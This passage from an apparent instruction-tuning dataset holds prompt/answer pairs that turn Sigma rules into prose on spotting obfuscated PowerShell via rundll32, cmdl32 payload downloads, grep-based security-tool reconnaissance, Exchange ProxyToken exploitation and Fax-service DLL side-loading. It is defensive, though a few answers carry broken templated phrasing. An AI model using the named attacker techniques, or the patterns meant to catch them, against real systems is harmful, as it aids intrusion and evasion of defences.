      "answer": "In order to detect obfuscated PowerShell via use of Rundll32 in scripts, you should monitor PowerShell script activities within a Windows environment, specifically looking for script execution that involves certain characteristics indicative of suspicious behavior. This requires that Script Block Logging is enabled on the system to accurately capture and analyze PowerShell script blocks.\n\nSpecifically, look for script block texts that contain all of the following elements: '&&', 'rundll32', 'shell32.dll', and 'shellexec_rundll'. Additionally, keep an eye out for script block texts that include any of these elements: 'value', 'invoke', 'comspec', or 'iex'. The presence of these strings within a script block is indicative of an attempt to execute commands or scripts in a manner that is commonly associated with obfuscation techniques, often aiming to bypass security measures by leveraging the 'rundll32' command alongside PowerShell.\n\nThese detection criteria are deemed to be of high importance due to the potential for these actions to be part of malicious activities, such as executing malware or facilitating unauthorized access to systems. However, it is important to be aware of potential unknown false positives, as there may be legitimate use cases that exhibit similar characteristics to these detection patterns.\n\nThe activity aligns with tactics and techniques that typically involve the Execution phase within the MITRE ATT&CK framework, especially where PowerShell is utilized for command and script execution in combination with the use of 'rundll32' to execute binary code. Monitoring for these specific script block texts serves as a crucial step in identifying and mitigating potential threats that leverage obfuscated PowerShell scripts for malicious purposes."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of system utilities (only grep for now) to discover security software discovery",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the usage of system utilities (only grep for now) to discover security software discovery, you should monitor the creation of processes on macOS systems. Specifically, pay attention to instances where the utility '/usr/bin/grep' is invoked. This utility might be used in a manner indicative of an adversary attempting to find out if certain security applications are installed on the system, including, but not limited to, vulnerability scanners like Nessus, security monitoring tools like Google Santa and Carbon Black, CrowdStrike Falcon's endpoint protection, various log shippers like Fluentd and Elastic's Beats (Filebeat, Packetbeat, Auditbeat), Facebook's osquery for system querying, Objective-See's BlockBlock and LuLu for persistence and firewall management, respectively, and the Objective Development's Little Snitch firewall management utility. The detection should trigger if the command line used to invoke 'grep' contains references to any of these applications. However, it's important to consider that there might be legitimate reasons for such queries, therefore occurrences might not always signify malicious intent, but they warrant further investigation. The aim is to identify possible reconnaissance activities which might be conducted by adversaries to weaken or bypass system defenses by identifying the security tools in place.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of system utilities (only grep for now) to discover security software discovery",
      "answer": "In order to detect the usage of system utilities (only grep for now) to discover security software discovery, you should monitor the creation of processes on macOS systems. Specifically, pay attention to instances where the utility '/usr/bin/grep' is invoked. This utility might be used in a manner indicative of an adversary attempting to find out if certain security applications are installed on the system, including, but not limited to, vulnerability scanners like Nessus, security monitoring tools like Google Santa and Carbon Black, CrowdStrike Falcon's endpoint protection, various log shippers like Fluentd and Elastic's Beats (Filebeat, Packetbeat, Auditbeat), Facebook's osquery for system querying, Objective-See's BlockBlock and LuLu for persistence and firewall management, respectively, and the Objective Development's Little Snitch firewall management utility. The detection should trigger if the command line used to invoke 'grep' contains references to any of these applications. However, it's important to consider that there might be legitimate reasons for such queries, therefore occurrences might not always signify malicious intent, but they warrant further investigation. The aim is to identify possible reconnaissance activities which might be conducted by adversaries to weaken or bypass system defenses by identifying the security tools in place."
    }
  },
  {
    "instruction": "Please help me detect the following: share is mounted using the \"net.exe\" utility",
    "context": "",
    "output": "Sure!\nIn order to detect when a share is mounted using the \"net.exe\" utility, you should: focus on monitoring process creation events within Windows environments. Specifically, keep an eye out for instances where the process image name ends with '\\net.exe' or '\\net1.exe', or alternatively, where the original file name is explicitly 'net.exe' or 'net1.exe'. Additionally, watch for command lines containing ' use ' or beginning with '\\\\\\\\' as these are indicative of attempts to mount a share. It's important to consider all these conditions together for a comprehensive detection strategy. Beware, however, that there are scenarios where these activities are part of legitimate administrative tasks or scripts, and these should be regarded as potential false positives. The sensitivity of this detection is classified as low.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "share is mounted using the \"net.exe\" utility",
      "answer": "In order to detect when a share is mounted using the \"net.exe\" utility, you should: focus on monitoring process creation events within Windows environments. Specifically, keep an eye out for instances where the process image name ends with '\\net.exe' or '\\net1.exe', or alternatively, where the original file name is explicitly 'net.exe' or 'net1.exe'. Additionally, watch for command lines containing ' use ' or beginning with '\\\\\\\\' as these are indicative of attempts to mount a share. It's important to consider all these conditions together for a comprehensive detection strategy. Beware, however, that there are scenarios where these activities are part of legitimate administrative tasks or scripts, and these should be regarded as potential false positives. The sensitivity of this detection is classified as low."
    }
  },
  {
    "instruction": "Can you explain how to detect: Keyvault Key is modified or deleted in Azure.",
    "context": "",
    "output": "Certainly!\n\nIn order to identify when a Keyvault Key is modified or deleted in Azure, you should monitor Azure Activity Logs for operations related to the creation, updating, importing, recovering, restoring, deleting, backing up, and purging of Keys in the Microsoft Keyvault service. Specifically, look for any activity logged with operation names such as MICROSOFT.KEYVAULT/VAULTS/KEYS/UPDATE/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE, MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/IMPORT/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/RECOVER/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/RESTORE/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/DELETE, MICROSOFT.KEYVAULT/VAULTS/KEYS/BACKUP/ACTION, and MICROSOFT.KEYVAULT/VAULTS/KEYS/PURGE/ACTION. These activities are significant indicators that a Keyvault Key is being tampered with which might include rightful updates or possibly malicious deletions or modifications.\n\nThere are some instances where modifications or deletions of keys might generate alerts but are part of normal administrative duties. Therefore, it's important to verify whether the changes were made by system administrators or known users who have legitimate reasons to perform these actions. Look into the user identity, user agent, and the hostname that initiated the change to determine its legitimacy. Activities carried out by unfamiliar users should be scrutinized, and if any known behavior is consistently raising false alarms, it may be considered for exemption to refine the alerting mechanism. Monitoring for these specific operations on Azure Keyvault keys is crucial for maintaining the integrity and security of key management within an organization's Azure environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Keyvault Key is modified or deleted in Azure.",
      "answer": "In order to identify when a Keyvault Key is modified or deleted in Azure, you should monitor Azure Activity Logs for operations related to the creation, updating, importing, recovering, restoring, deleting, backing up, and purging of Keys in the Microsoft Keyvault service. Specifically, look for any activity logged with operation names such as MICROSOFT.KEYVAULT/VAULTS/KEYS/UPDATE/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE, MICROSOFT.KEYVAULT/VAULTS/KEYS/CREATE/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/IMPORT/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/RECOVER/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/RESTORE/ACTION, MICROSOFT.KEYVAULT/VAULTS/KEYS/DELETE, MICROSOFT.KEYVAULT/VAULTS/KEYS/BACKUP/ACTION, and MICROSOFT.KEYVAULT/VAULTS/KEYS/PURGE/ACTION. These activities are significant indicators that a Keyvault Key is being tampered with which might include rightful updates or possibly malicious deletions or modifications.\n\nThere are some instances where modifications or deletions of keys might generate alerts but are part of normal administrative duties. Therefore, it's important to verify whether the changes were made by system administrators or known users who have legitimate reasons to perform these actions. Look into the user identity, user agent, and the hostname that initiated the change to determine its legitimacy. Activities carried out by unfamiliar users should be scrutinized, and if any known behavior is consistently raising false alarms, it may be considered for exemption to refine the alerting mechanism. Monitoring for these specific operations on Azure Keyvault keys is crucial for maintaining the integrity and security of key management within an organization's Azure environment."
    }
  },
  {
    "instruction": "How to detect: Detect a system being shutdown or put into different boot mode",
    "context": "",
    "output": "In order to detect a system being shutdown or put into a different boot mode, you should focus on monitoring Cisco's Authentication, Authorization, and Accounting (AAA) logs. Specifically, pay attention to commands related to shutting down the system or altering the configuration register settings. The commands to look out for include 'shutdown', 'config-register 0x2100', and 'config-register 0x2142'. If these commands appear in the AAA service logs, it could indicate that someone is attempting to either shut down the system or change its boot mode, potentially for malicious purposes. It is important, though, to consider that legitimate administrators might execute these commands, although such instances are rare. The detection of these events is tagged with tactics and techniques such as Impact, specifically reflecting an adversary's attempt to interfere with or disrupt system processes. The fields to be monitored in the logs include the set of commands executed (CmdSet). The security level associated with this detection is considered medium, reflecting the potential impact of these actions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect a system being shutdown or put into different boot mode",
      "answer": "In order to detect a system being shutdown or put into a different boot mode, you should focus on monitoring Cisco's Authentication, Authorization, and Accounting (AAA) logs. Specifically, pay attention to commands related to shutting down the system or altering the configuration register settings. The commands to look out for include 'shutdown', 'config-register 0x2100', and 'config-register 0x2142'. If these commands appear in the AAA service logs, it could indicate that someone is attempting to either shut down the system or change its boot mode, potentially for malicious purposes. It is important, though, to consider that legitimate administrators might execute these commands, although such instances are rare. The detection of these events is tagged with tactics and techniques such as Impact, specifically reflecting an adversary's attempt to interfere with or disrupt system processes. The fields to be monitored in the logs include the set of commands executed (CmdSet). The security level associated with this detection is considered medium, reflecting the potential impact of these actions."
    }
  },
  {
    "instruction": "How can I detect: changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.",
    "context": "",
    "output": "In order to detect changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet, you should monitor Windows Registry settings specifically for \"SetValue\" events. Focus on changes made under the `\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\` path with particular attention to any modifications ending with '\\Internet', '\\LocalIntranet', '\\MyComputer', '\\TrustedSites', or '\\UntrustedSites'. The critical detail to look for is the 'Enabled' status in these registry settings. These changes might signal an attempt to lower security measures and facilitate installations from less secure or trusted locations. However, be aware that some legitimate internal requirements might necessitate such modifications, leading to possible false positives. The severity of this detection is considered medium, emphasizing its importance without suggesting it signals an immediate and critical threat. Understanding these modifications can play a crucial role in identifying potential security risks associated with the weakening of ClickOnce trust prompts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.",
      "answer": "In order to detect changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet, you should monitor Windows Registry settings specifically for \"SetValue\" events. Focus on changes made under the `\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\` path with particular attention to any modifications ending with '\\Internet', '\\LocalIntranet', '\\MyComputer', '\\TrustedSites', or '\\UntrustedSites'. The critical detail to look for is the 'Enabled' status in these registry settings. These changes might signal an attempt to lower security measures and facilitate installations from less secure or trusted locations. However, be aware that some legitimate internal requirements might necessitate such modifications, leading to possible false positives. The severity of this detection is considered medium, emphasizing its importance without suggesting it signals an immediate and critical threat. Understanding these modifications can play a crucial role in identifying potential security risks associated with the weakening of ClickOnce trust prompts."
    }
  },
  {
    "instruction": "Explain how should I detect the following: EFS Fileshare is modified or deleted.\nYou can't delete a file system that is in use.\nIf the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare.\n",
    "context": "",
    "output": "In order to detect when an EFS Fileshare is modified or deleted, you should focus on monitoring AWS CloudTrail logs for specific events indicating such modifications or deletions. Specifically, look for logs where the event source is `elasticfilesystem.amazonaws.com` and the event name is `DeleteFileSystem`. This combination of event source and name flags when an Elastic File System (EFS) is being deleted. It's important to note that an EFS file system cannot be deleted while it is in use. Therefore, any deletion event suggests that its associated mount targets might have been removed beforehand, likely indicating malicious activity aimed at modifying or removing the fileshare. This monitoring strategy is crucial, given the medium level of threat it represents, and while there might be legitimate reasons for these actions (though marked as 'Unknown' for false positives), they warrant investigation to rule out any adversarial actions aimed at impacting file storage integrity or availability.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "EFS Fileshare is modified or deleted.\nYou can't delete a file system that is in use.\nIf the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare.\n",
      "answer": "In order to detect when an EFS Fileshare is modified or deleted, you should focus on monitoring AWS CloudTrail logs for specific events indicating such modifications or deletions. Specifically, look for logs where the event source is `elasticfilesystem.amazonaws.com` and the event name is `DeleteFileSystem`. This combination of event source and name flags when an Elastic File System (EFS) is being deleted. It's important to note that an EFS file system cannot be deleted while it is in use. Therefore, any deletion event suggests that its associated mount targets might have been removed beforehand, likely indicating malicious activity aimed at modifying or removing the fileshare. This monitoring strategy is crucial, given the medium level of threat it represents, and while there might be legitimate reasons for these actions (though marked as 'Unknown' for false positives), they warrant investigation to rule out any adversarial actions aimed at impacting file storage integrity or availability."
    }
  },
  {
    "instruction": "Explain how should I detect the following: use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\"\n",
    "context": "",
    "output": "In order to detect the use of grep to identify information about the operating system architecture, often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\", you should: Monitor process creation logs on Linux systems for any instance where the 'grep' command ends its execution path, indicating it's being used. Additionally, pay attention to cases where the command line arguments end with architecture information keywords such as 'aarch64', 'arm', 'i386', 'i686', 'mips', or 'x86_64'. These indicators can suggest an attempt to pinpoint the architecture of the operating system, which may be a precursor or component of a larger reconnaissance strategy. It is important to capture all conditions where both the specific use of 'grep' and these architecture-related command line arguments occur together. However, be aware that this rule might produce unknown false positives, meaning it should be considered as having a low alert level until further verification of malicious intent can be established.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\"\n",
      "answer": "In order to detect the use of grep to identify information about the operating system architecture, often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\", you should: Monitor process creation logs on Linux systems for any instance where the 'grep' command ends its execution path, indicating it's being used. Additionally, pay attention to cases where the command line arguments end with architecture information keywords such as 'aarch64', 'arm', 'i386', 'i686', 'mips', or 'x86_64'. These indicators can suggest an attempt to pinpoint the architecture of the operating system, which may be a precursor or component of a larger reconnaissance strategy. It is important to capture all conditions where both the specific use of 'grep' and these architecture-related command line arguments occur together. However, be aware that this rule might produce unknown false positives, meaning it should be considered as having a low alert level until further verification of malicious intent can be established."
    }
  },
  {
    "instruction": "How to detect: creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n",
    "context": "",
    "output": "In order to Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks. This can be a false positive on server systems but on workstations users should rarely mount .iso or .img files., you should: Monitor Windows file event logs for the creation of files ending in '.iso.lnk', '.img.lnk', '.vhd.lnk', or '.vhdx.lnk' which are located within the \\Microsoft\\Windows\\Recent\\ directory. This activity is indicative of attackers leveraging link files to masquerade malicious image files typically used in phishing campaigns. It's important to note that in some instances, legitimate user actions may involve mounting image files such as ISO or IMG, which could result in false positives, particularly on server systems where such activities might be more common. The detection of these file creations is of medium importance, and the associated tactics and techniques include Initial Access through phishing attacks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks.\nThis can be a false positive on server systems but on workstations users should rarely mount .iso or .img files.\n",
      "answer": "In order to Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks. This can be a false positive on server systems but on workstations users should rarely mount .iso or .img files., you should: Monitor Windows file event logs for the creation of files ending in '.iso.lnk', '.img.lnk', '.vhd.lnk', or '.vhdx.lnk' which are located within the \\Microsoft\\Windows\\Recent\\ directory. This activity is indicative of attackers leveraging link files to masquerade malicious image files typically used in phishing campaigns. It's important to note that in some instances, legitimate user actions may involve mounting image files such as ISO or IMG, which could result in false positives, particularly on server systems where such activities might be more common. The detection of these file creations is of medium importance, and the associated tactics and techniques include Initial Access through phishing attacks."
    }
  },
  {
    "instruction": "Explain how should I detect the following: lolbas Cmdl32 is use to download a payload to evade antivirus",
    "context": "",
    "output": "In order to lolbas Cmdl32 is used to download a payload to evade antivirus, you should: Monitor the creation of processes on Windows operating systems, focusing on cases where the process image name ends with '\\cmdl32.exe' or the original file name is identified exactly as CMDL32.EXE. Additionally, watch for command-line parameters that contain both '/vpn ' and '/lan ', as these are characteristic of the technique being employed to download malicious payloads while attempting to bypass antivirus detection. Recognize that sightings of these indicators may not always be malicious in nature (thus considered as potential false positives) but warrant a medium level of attention due to their association with evasive tactics.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "lolbas Cmdl32 is use to download a payload to evade antivirus",
      "answer": "In order to lolbas Cmdl32 is used to download a payload to evade antivirus, you should: Monitor the creation of processes on Windows operating systems, focusing on cases where the process image name ends with '\\cmdl32.exe' or the original file name is identified exactly as CMDL32.EXE. Additionally, watch for command-line parameters that contain both '/vpn ' and '/lan ', as these are characteristic of the technique being employed to download malicious payloads while attempting to bypass antivirus detection. Recognize that sightings of these indicators may not always be malicious in nature (thus considered as potential false positives) but warrant a medium level of attention due to their association with evasive tactics."
    }
  },
  {
    "instruction": "How to detect: PIM elevation is approved or denied. Outside of normal operations should be investigated.",
    "context": "",
    "output": "In order to detect when a PIM (Privileged Identity Management) elevation is approved or denied, which is outside of normal operations and should be investigated, you should: Focus on monitoring Azure audit logs. Specifically, look for any audit log entries that contain messages indicating that a request has been either approved or denied. This detection is crucial because unauthorized or abnormal approvals or denials of privilege elevations can indicate potential security breaches or misuse of privileges, which are significant concerns for maintaining the integrity and security of an organization's information systems. It's essential to note that legitimate administrative activities, where an actual admin is using the PIM, might lead to false positives. Therefore, these occurrences should be carefully examined to differentiate between normal administrative actions and potential security incidents. The severity level for this kind of activity is considered high due to the potential impact of unauthorized access or privilege escalation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "PIM elevation is approved or denied. Outside of normal operations should be investigated.",
      "answer": "In order to detect when a PIM (Privileged Identity Management) elevation is approved or denied, which is outside of normal operations and should be investigated, you should: Focus on monitoring Azure audit logs. Specifically, look for any audit log entries that contain messages indicating that a request has been either approved or denied. This detection is crucial because unauthorized or abnormal approvals or denials of privilege elevations can indicate potential security breaches or misuse of privileges, which are significant concerns for maintaining the integrity and security of an organization's information systems. It's essential to note that legitimate administrative activities, where an actual admin is using the PIM, might lead to false positives. Therefore, these occurrences should be carefully examined to differentiate between normal administrative actions and potential security incidents. The severity level for this kind of activity is considered high due to the potential impact of unauthorized access or privilege escalation."
    }
  },
  {
    "instruction": "Please help me detect the following: execution of CSharp interactive console by PowerShell",
    "context": "",
    "output": "Sure!\nIn order to detect the execution of CSharp interactive console by PowerShell, you should monitor for process creation events within Windows environments. Specifically, look for instances where the process image ends with '\\csi.exe', indicating the CSharp interactive console is being executed. Additionally, it's important to check that the parent process image is either PowerShell ('powershell.exe'), the cross-platform version of PowerShell ('pwsh.exe'), or the PowerShell ISE ('powershell_ise.exe'). Verification that the original file name of the process is 'csi.exe' also helps confirm the detection. False positives might occur, so it's recommended to correlate this activity with other suspicious behaviors such as network connections or unusual command-line arguments. This detection carries a high level of importance due to its specificity and the context in which such an execution scenario occurs.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of CSharp interactive console by PowerShell",
      "answer": "In order to detect the execution of CSharp interactive console by PowerShell, you should monitor for process creation events within Windows environments. Specifically, look for instances where the process image ends with '\\csi.exe', indicating the CSharp interactive console is being executed. Additionally, it's important to check that the parent process image is either PowerShell ('powershell.exe'), the cross-platform version of PowerShell ('pwsh.exe'), or the PowerShell ISE ('powershell_ise.exe'). Verification that the original file name of the process is 'csi.exe' also helps confirm the detection. False positives might occur, so it's recommended to correlate this activity with other suspicious behaviors such as network connections or unusual command-line arguments. This detection carries a high level of importance due to its specificity and the context in which such an execution scenario occurs."
    }
  },
  {
    "instruction": "How to detect: usage of the \"net.exe\" command to start a service using the \"start\" flag",
    "context": "",
    "output": "In order to detect the usage of the \"net.exe\" command to start a service using the \"start\" flag, you should monitor Windows process creation logs for instances where the \"net.exe\" or \"net1.exe\" file is executed. Specifically, look for occurrences where the command line includes the ' start ' sequence, ensuring there's a space character both before and after \"start\". This detail is essential as it differentiates between the use of the command to begin a service versus other potential uses of \"net start\" for discovering services. However, be mindful that such detections may sometimes flag legitimate activities, such as administrators or users starting a service for non-malicious reasons. Given this, the level of concern for these detections is considered low.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"net.exe\" command to start a service using the \"start\" flag",
      "answer": "In order to detect the usage of the \"net.exe\" command to start a service using the \"start\" flag, you should monitor Windows process creation logs for instances where the \"net.exe\" or \"net1.exe\" file is executed. Specifically, look for occurrences where the command line includes the ' start ' sequence, ensuring there's a space character both before and after \"start\". This detail is essential as it differentiates between the use of the command to begin a service versus other potential uses of \"net start\" for discovering services. However, be mindful that such detections may sometimes flag legitimate activities, such as administrators or users starting a service for non-malicious reasons. Given this, the level of concern for these detections is considered low."
    }
  },
  {
    "instruction": "How to detect: ping command that uses a hex encoded IP address",
    "context": "",
    "output": "In order to detect a ping command that uses a hex encoded IP address, you should monitor process creation logs on Windows systems for occurrences where the 'ping.exe' process is executed with a command line that includes hexadecimal IP addresses. Specifically, look for the execution path ending with '\\ping.exe' and command line arguments containing '0x', which suggests a hexadecimal value is being used. For analysis, make sure to capture the ParentCommandLine fields as it might provide additional context about the execution. This activity is flagged with a high level of suspicion as under normal circumstances, administrators do not use hexadecimal IP addresses with ping commands, making legitimate use cases highly unlikely.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "ping command that uses a hex encoded IP address",
      "answer": "In order to detect a ping command that uses a hex encoded IP address, you should monitor process creation logs on Windows systems for occurrences where the 'ping.exe' process is executed with a command line that includes hexadecimal IP addresses. Specifically, look for the execution path ending with '\\ping.exe' and command line arguments containing '0x', which suggests a hexadecimal value is being used. For analysis, make sure to capture the ParentCommandLine fields as it might provide additional context about the execution. This activity is flagged with a high level of suspicion as under normal circumstances, administrators do not use hexadecimal IP addresses with ping commands, making legitimate use cases highly unlikely."
    }
  },
  {
    "instruction": "Can you explain how to detect: exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766, you should monitor web server logs for specific patterns that indicate an attempted exploitation. Look out for HTTP POST requests exhibiting one of two specific characteristic patterns in their URI queries, each of which signals a potentially malicious attempt to exploit this vulnerability.\n\nFirst, pay attention to POST requests where the query contains '/ecp/' alongside '/RulesEditor/InboxRules.svc/NewObject', and the server's response status code is 500. This specific pattern could indicate an attempt to exploit the vulnerability by interacting with the Exchange Control Panel (ECP) in a manner that results in an error response from the server, which is typical of exploitation attempts that do not fully succeed or trigger an unexpected condition on the server.\n\nSecond, look for POST requests that include 'SecurityToken=' and '/ecp/' in the URI query, also resulting in a status code of 500 from the server. This pattern suggests an attempt to use a security token inappropriately within the context of the ECP, another red flag for exploitation attempts.\n\nWhenever such requests are identified, important information such as the client's IP address (c-ip) and DNS name (c-dns), if available, should be logged and reported. This data is crucial for further investigation and potentially blocking or mitigating against the source of these requests.\n\nIt's important to note that while these patterns are critical signs of potential exploitation attempts, they may also be triggered in benign scenarios which are currently unknown. Therefore, any detection mechanisms should be set at a critical level but also allow for the verification of detected patterns to rule out any false positives.\n\nIn summary, by effectively monitoring for these specified patterns within web server logs, one can detect and possibly prevent the exploitation attempts of the Microsoft Exchange ProxyToken vulnerability, aiding in the protection of the server infrastructure against unauthorized access and manipulation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766",
      "answer": "In order to detect the exploitation of Microsoft Exchange ProxyToken vulnerability as described in CVE-2021-33766, you should monitor web server logs for specific patterns that indicate an attempted exploitation. Look out for HTTP POST requests exhibiting one of two specific characteristic patterns in their URI queries, each of which signals a potentially malicious attempt to exploit this vulnerability.\n\nFirst, pay attention to POST requests where the query contains '/ecp/' alongside '/RulesEditor/InboxRules.svc/NewObject', and the server's response status code is 500. This specific pattern could indicate an attempt to exploit the vulnerability by interacting with the Exchange Control Panel (ECP) in a manner that results in an error response from the server, which is typical of exploitation attempts that do not fully succeed or trigger an unexpected condition on the server.\n\nSecond, look for POST requests that include 'SecurityToken=' and '/ecp/' in the URI query, also resulting in a status code of 500 from the server. This pattern suggests an attempt to use a security token inappropriately within the context of the ECP, another red flag for exploitation attempts.\n\nWhenever such requests are identified, important information such as the client's IP address (c-ip) and DNS name (c-dns), if available, should be logged and reported. This data is crucial for further investigation and potentially blocking or mitigating against the source of these requests.\n\nIt's important to note that while these patterns are critical signs of potential exploitation attempts, they may also be triggered in benign scenarios which are currently unknown. Therefore, any detection mechanisms should be set at a critical level but also allow for the verification of detected patterns to rule out any false positives.\n\nIn summary, by effectively monitoring for these specified patterns within web server logs, one can detect and possibly prevent the exploitation attempts of the Microsoft Exchange ProxyToken vulnerability, aiding in the protection of the server infrastructure against unauthorized access and manipulation."
    }
  },
  {
    "instruction": "How can I detect: The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service.",
    "context": "",
    "output": "In order to detect an attack where the Fax service tries to load a non-existent DLL named ualapi.dll, allowing an attacker to side-load their own malicious DLL using this service, you should monitor Windows image load events.\n\nSpecifically, focus on instances where the process `\\fxssvc.exe`, which is associated with the Windows Fax service, attempts to load a DLL. If the DLL being loaded ends with 'ualapi.dll', it signals a potential malicious activity because 'ualapi.dll' does not exist by default in Windows systems. This anomaly might indicate an attacker's attempt to exploit the Fax service for DLL side-loading.\n\nHowever, to reduce false positives, any loading of DLL files that start with the path 'C:\\Windows\\WinSxS\\' should be excluded from alerts. This path is a legitimate system directory used for storing side-by-side assemblies in Windows and could contain various versions of DLLs needed by the system or legitimate applications.\n\nThis analysis falls under the high importance level due to the potential for malicious actors to exploit the Fax service to achieve persistence, evade defenses, or execute their code with the privileges of the fax service. Monitoring for such behavior is critical in identifying sophisticated adversaries attempting to utilize this technique.\n\nLook for these signs in the logs of Windows image loading events, focusing on filtering out legitimate uses while catching malicious attempts at exploiting the Fax service through DLL side-loading.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service.",
      "answer": "In order to detect an attack where the Fax service tries to load a non-existent DLL named ualapi.dll, allowing an attacker to side-load their own malicious DLL using this service, you should monitor Windows image load events.\n\nSpecifically, focus on instances where the process `\\fxssvc.exe`, which is associated with the Windows Fax service, attempts to load a DLL. If the DLL being loaded ends with 'ualapi.dll', it signals a potential malicious activity because 'ualapi.dll' does not exist by default in Windows systems. This anomaly might indicate an attacker's attempt to exploit the Fax service for DLL side-loading.\n\nHowever, to reduce false positives, any loading of DLL files that start with the path 'C:\\Windows\\WinSxS\\' should be excluded from alerts. This path is a legitimate system directory used for storing side-by-side assemblies in Windows and could contain various versions of DLLs needed by the system or legitimate applications.\n\nThis analysis falls under the high importance level due to the potential for malicious actors to exploit the Fax service to achieve persistence, evade defenses, or execute their code with the privileges of the fax service. Monitoring for such behavior is critical in identifying sophisticated adversaries attempting to utilize this technique.\n\nLook for these signs in the logs of Windows image loading events, focusing on filtering out legitimate uses while catching malicious attempts at exploiting the Fax service through DLL side-loading."
    }
  },
  {
    "instruction": "Can you explain how to detect: block events for files that are disallowed by code integrity for protected processes",
    "context": "",
    "output": "Certainly!\n\nIn order to detect block events for files that are disallowed by code integrity for protected processes, you should focus on monitoring the Code Integrity operational service logs within Windows environments. Pay particular attention to event ID 3104, which signals that Windows has blocked a file that was not allowed to interact with protected processes due to code integrity policies. Given the context of this event, it's considered highly unlikely to encounter false positives, indicating a high level of trust in the accuracy of this detection method. By tracking such events, you can identify instances where unauthorized or malicious files attempt to execute or interact with critical and protected system processes, helping maintain the integrity and security of the system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "block events for files that are disallowed by code integrity for protected processes",
      "answer": "In order to detect block events for files that are disallowed by code integrity for protected processes, you should focus on monitoring the Code Integrity operational service logs within Windows environments. Pay particular attention to event ID 3104, which signals that Windows has blocked a file that was not allowed to interact with protected processes due to code integrity policies. Given the context of this event, it's considered highly unlikely to encounter false positives, indicating a high level of trust in the accuracy of this detection method. By tracking such events, you can identify instances where unauthorized or malicious files attempt to execute or interact with critical and protected system processes, helping maintain the integrity and security of the system."
    }
  },
  {
    "instruction": "How to detect: An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
    "context": "",
